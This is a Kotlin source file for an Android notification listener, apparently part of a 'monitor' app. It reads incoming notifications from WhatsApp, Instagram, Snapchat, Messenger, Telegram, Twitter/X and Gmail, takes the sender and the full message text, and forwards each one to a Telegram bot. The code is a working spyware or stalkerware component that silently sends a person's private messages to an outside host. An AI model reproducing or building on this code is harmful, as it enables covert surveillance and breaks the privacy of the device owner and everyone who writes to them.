package com.dec.monitor.notification

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class NotificationListener : NotificationListenerService() {

    private val trackedApps = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "com.instagram.android",
        "com.snapchat.android",
        "com.facebook.orca",
        "org.telegram.messenger",
        "com.twitter.android",
        "com.google.android.gm"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return
        if (pkg !in trackedApps) return

        val extras = sbn.notification?.extras ?: return
        val title = extras.getString("android.title") ?: return
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: text

        val appName = when (pkg) {
            "com.whatsapp", "com.whatsapp.w4b" -> "WhatsApp"
            "com.instagram.android" -> "Instagram"
            "com.snapchat.android" -> "Snapchat"
            "com.facebook.orca" -> "Messenger"
            "org.telegram.messenger" -> "Telegram"
            "com.twitter.android" -> "Twitter/X"
            "com.google.android.gm" -> "Gmail"
            else -> pkg
        }

        CoroutineScope(Dispatchers.IO).launch {
            TelegramBot.sendMessage(
                "🔔 <b>$appName</b>\n<b>$title</b>\n$bigText"
            )
        }
    }
}
